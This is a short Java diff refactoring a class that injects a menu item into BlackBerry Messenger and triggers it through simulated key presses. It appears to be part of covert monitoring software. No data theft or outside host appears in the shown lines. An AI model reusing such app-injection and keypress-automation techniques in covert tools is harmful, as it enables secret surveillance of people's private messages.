@@ -64,7 +64,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         //#ifdef DEBUG
         debug.trace("injectMenu");
         //#endif
-        menu.addMenuBBM("Yield");
+        menu.addMenuBBM();
         return true;
     }
 
@@ -98,17 +98,12 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(delay + tries * 20);
-        if (true) {
-            //#ifdef DEBUG
-            debug.trace("callMenuByKey: pressRawKey, time=" + delay + tries * 20);
-            //#endif
-            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-        } else {
-            //#ifdef DEBUG
-            debug.trace("callMenuByKey: pressKey");
-            //#endif
-            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
-        }
+
+        //#ifdef DEBUG
+        debug.trace("callMenuByKey: pressRawKey, time=" + delay + tries * 20);
+        //#endif
+        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+
         Utils.sleep(delay + tries * 20);
         //KeyInjector.trackBallRawClick();
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
